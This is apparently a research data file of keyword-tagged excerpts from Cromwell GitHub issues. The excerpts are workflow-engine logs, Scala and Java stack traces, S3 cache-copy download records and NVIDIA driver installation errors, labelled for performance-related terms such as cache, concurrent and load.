EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:50,35] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.assessment_ages:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:50,48] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.assessment_ages' (scatter index: None, attempt 1); [2022-12-15 21:27:50,82] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.genetic_sex:-1:1-20000000011 [9e4f5894main.genetic_sex:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:27:50,82] [info] BT-322 9e4f5894:main.genetic_sex:-1:1 cache hit copying success with aggregated hashes: initial = FD7DC79B974CF6706FC3376F067965B9, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:50,82] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecuti",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:28795,cache,cache,28795,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['cache'],['cache']
Performance,"3); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:333); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:332); 	at scala.util.Success$$anonfun$map$1.apply(Try.scala:237); 	at scala.util.Try$.apply(Try.scala:192); 	at scala.util.Success.map(Try.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2017-01-20 09:33:07,58] [info] WorkflowManagerActor WorkflowActor-814c47aa-9d11-4c81-a08c-f2b77c002b46 is in a terminal state: WorkflowFailedState; [2017-01-20 09:33:24,62] [info] SingleWorkflowRunnerActor workflow finished with status 'Failed'.; Workflow 814c47aa-9d11-4c81-a08c-f2b77c002b46 transitioned to state Failed; ```. Failure is due to inability to find t",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1906:14836,concurren,concurrent,14836,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1906,1,['concurren'],['concurrent']
Performance,"3); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:333); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:332); 	at scala.util.Success$$anonfun$map$1.apply(Try.scala:237); 	at scala.util.Try$.apply(Try.scala:192); 	at scala.util.Success.map(Try.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```; ```; $ tail -n 10 stderr; Traceback (most recent call last):; File ""/src/Merge_MAFs.py"", line 182, in <module>; main(sys.argv[1:]); File ""/src/Merge_MAFs.py"", line 76, in main; concatenatedMafFilename = _handle_mafs(args); File ""/src/Merge_MAFs.py"", line 83, in _handle_mafs; mafPaths = _getMafPaths(args.mafpaths); File ""/src/Merge_MAFs.py"", line 98, in _getMa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:6544,concurren,concurrent,6544,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,1,['concurren'],['concurrent']
Performance,"3000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""db-1"" #26 daemon prio=5 os_prio=31 tid=0x00007fb76b442000 nid=0x7903 waiting on condition [0x000000012d905000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""Hikari Housekeeping Timer (pool db)"" #24 daemon prio=5 os_prio=31 tid=0x00007fb76d88f000 nid=0x7503 waiting on condition [0x000000012cebb000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Uns",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:40521,concurren,concurrent,40521,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"32 INFO - WorkflowManagerActor Successfully started WorkflowActor-948bf608-f91b-46a7-b892-86454be067fd; 2018-06-06 16:18:47,223 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2018-06-06 16:18:47,229 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - MaterializeWorkflowDescriptorActor [UUID(948bf608)]: Parsing workflow as WDL draft-2; 2018-06-06 16:18:47,232 cromwell-system-akka.dispatchers.engine-dispatcher-32 ERROR - WorkflowManagerActor Workflow 948bf608-f91b-46a7-b892-86454be067fd failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736:1981,concurren,concurrent,1981,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736,1,['concurren'],['concurrent']
Performance,"39); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:4025,concurren,concurrent,4025,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['concurren'],['concurrent']
Performance,"3: call caching: in order to make the cache hit, we only need to obtain the MD5 from the input and match it to something run before. If we can get this from the supplied psURL then we have the md5 and can match internally. . As long as we are not using psURLs as destinations (e.g. we are still writing task outputs to the cromwell execution bucket) performing the ""hit"" (e.g. doing the copy/reference) shouldn't be affected by psURLs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-401390686:38,cache,cache,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-401390686,2,"['cache', 'perform']","['cache', 'performing']"
Performance,"3:40:18 UTC] Obtaining toolchain_env file from https://storage.googleapis.com/cos-tools/12871.1174.0/toolchain_env. real	0m0.126s; user	0m0.014s; sys	0m0.001s; [INFO 2020-08-04 23:40:18 UTC] Downloading toolchain from https://storage.googleapis.com/cos-tools/12871.1174.0/toolchain.tar.xz. real	0m11.907s; user	0m0.428s; sys	0m1.039s; [INFO 2020-08-04 23:41:17 UTC] Configuring environment variables for cross-compilation; [INFO 2020-08-04 23:41:17 UTC] Configuring installation directories; [INFO 2020-08-04 23:41:17 UTC] Updating container's ld cache; [INFO 2020-08-04 23:41:20 UTC] Configuring kernel sources; [INFO 2020-08-04 23:41:42 UTC] Modifying kernel version magic string in source files; [INFO 2020-08-04 23:41:42 UTC] Running Nvidia installer. ERROR: The kernel module failed to load, because it was not signed by a key; that is trusted by the kernel. Please try installing the driver; again, and set the --module-signing-secret-key and; --module-signing-public-key options on the command line, or run the; installer in expert mode to enable the interactive module signing; prompts. ERROR: Unable to load the kernel module 'nvidia.ko'. This happens most; frequently when this kernel module was built against the wrong or; improperly configured kernel sources, with a version of gcc that; differs from the one used to build the target kernel, or if another; driver, such as nouveau, is present and prevents the NVIDIA kernel; module from obtaining ownership of the NVIDIA GPU(s), or no NVIDIA; GPU installed in this system is supported by this NVIDIA Linux; graphics driver release. Please see the log entries 'Kernel module load error' and 'Kernel; messages' at the end of the file; '/usr/local/nvidia/nvidia-installer.log' for more information. ERROR: Installation has failed. Please see the file; '/usr/local/nvidia/nvidia-installer.log' for details. You may find; suggestions on fixing installation problems in the README available; on the Linux driver download page at www.nvidia.com.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5714:5392,load,load,5392,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5714,2,['load'],['load']
Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-100/cacheCopy/SR00c.HG04158.txt.gz; 1608597430528,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-30/cacheCopy/SR00c.HG01474.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-30/cacheCopy/SR00c.HG01474.txt.gz.tbi; 1608597432512,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-98/cacheCopy/SR00c.HG03888.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-98/cacheCopy/SR00c.HG03888.txt.gz; 1608597434353,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-26/cacheCopy/SR00c.HG01356.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:134742,cache,cacheCopy,134742,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-101/cacheCopy/SR00c.HG04161.txt.gz; 1608597504024,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-62/cacheCopy/SR00c.HG02491.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-62/cacheCopy/SR00c.HG02491.txt.gz.tbi; 1608597507274,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-60/cacheCopy/SR00c.HG02489.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-60/cacheCopy/SR00c.HG02489.txt.gz; 1608597508511,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-88/cacheCopy/SR00c.HG03694.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:157172,cache,cacheCopy,157172,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-103/cacheCopy/SR00c.NA06984.txt.gz; 1608597637215,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-39/cacheCopy/SR00c.HG01861.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-39/cacheCopy/SR00c.HG01861.txt.gz.tbi; 1608597639911,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-111/cacheCopy/SR00c.NA18530.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-111/cacheCopy/SR00c.NA18530.txt.gz; 1608597642095,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-137/cacheCopy/SR00c.NA19746.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:193554,cache,cacheCopy,193554,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-115/cacheCopy/SR00c.NA18560.txt.gz; 1608597439856,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-32/cacheCopy/SR00c.HG01572.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-32/cacheCopy/SR00c.HG01572.txt.gz.tbi; 1608597442529,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-54/cacheCopy/SR00c.HG02272.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-54/cacheCopy/SR00c.HG02272.txt.gz; 1608597443863,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-54/cacheCopy/SR00c.HG02272.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:137865,cache,cacheCopy,137865,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"4-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-116/cacheCopy/SR00c.NA18638.txt.gz; 1608597602076,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-20/cacheCopy/SR00c.HG01060.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-20/cacheCopy/SR00c.HG01060.txt.gz.tbi; 1608597604365,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-50/cacheCopy/SR00c.HG02085.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-50/cacheCopy/SR00c.HG02085.txt.gz.tbi; 1608597606470,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:184212,cache,cacheCopy,184212,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
